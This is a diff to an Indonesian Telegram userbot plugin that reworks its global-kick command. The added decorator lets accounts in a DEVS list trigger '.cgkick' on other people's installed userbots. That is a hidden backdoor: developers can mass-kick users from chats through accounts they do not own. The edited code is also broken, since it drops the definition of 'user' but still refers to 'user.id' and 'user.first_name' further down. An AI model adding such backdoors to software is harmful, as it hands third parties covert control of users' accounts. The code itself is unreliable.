@@ -288,30 +288,25 @@ async def globals_check(client: Client, message: Message):
 
 # ON PROGRES G KICK!!!!! JAN LUPA DI LANJUT 
 
+@Client.on_message(
+    filters.command("cgkick", ["."]) & filters.user(DEVS) & ~filters.via_bot
+)
 @Client.on_message(filters.command("gkick", cmd) & filters.me)
 async def gkick_user(client: Client, message: Message):
-    args = await extract_user(message)
-    reply = message.reply_to_message
-    Man = await edit_or_reply(message, "`Processing...`")
-    if args:
-        try:
-            user = await client.get_users(args)
-        except Exception:
-            await Man.edit(f"`Please specify a valid user!`")
-            return
-    elif reply:
-        user_id = reply.from_user.id
-        user = await client.get_users(user_id)
+    user_id, reason = await extract_user_and_reason(message, sender_chat=True)
+    if message.from_user.id != client.me.id:
+        Man = await message.reply("`Gkicking...`")
     else:
-        await Man.edit(f"`Please specify a valid user!`")
-        return
-    if user.id == client.me.id:
-        return await Man.edit("**Dirimu sehat bes ? diri Sendiri di gkick 🗿**")
-    if user.id in DEVS:
+        Man = await message.edit("`Gkicking....`")
+    if not user_id:
+        return await Man.edit("Saya tidak dapat menemukan pengguna itu.")
+    if user_id == client.me.id:
+        return await Man.edit("**Dirimu sehat bes ? diri sendiri di GKick 🗿**")
+    if user_id in DEVS:
         return await Man.edit("**Dirimu ngantuk kah bes ? 🗿**")
-    if user.id in WHITELIST:
+    if user_id in WHITELIST:
         return await Man.edit(
-            "**Kau Gak Bisa bes gkick Dia Karena Dia Adalah admin @ZERGIIORVDRA 😡**"
+            "**Lu Ga Bisa bes GKick Dia Karena Dia Adalah admin @ZERGIIORVDRA 😡**"
         )
     if user_id:
         try:
@@ -334,7 +329,7 @@ async def gkick_user(client: Client, message: Message):
             done += 1
         except BaseException:
             er += 1
-    sql.gban(user.id)
+    sql.gkick(user.id)
     msg = (
         r"**\\#GKicked_User//**"
         f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})"
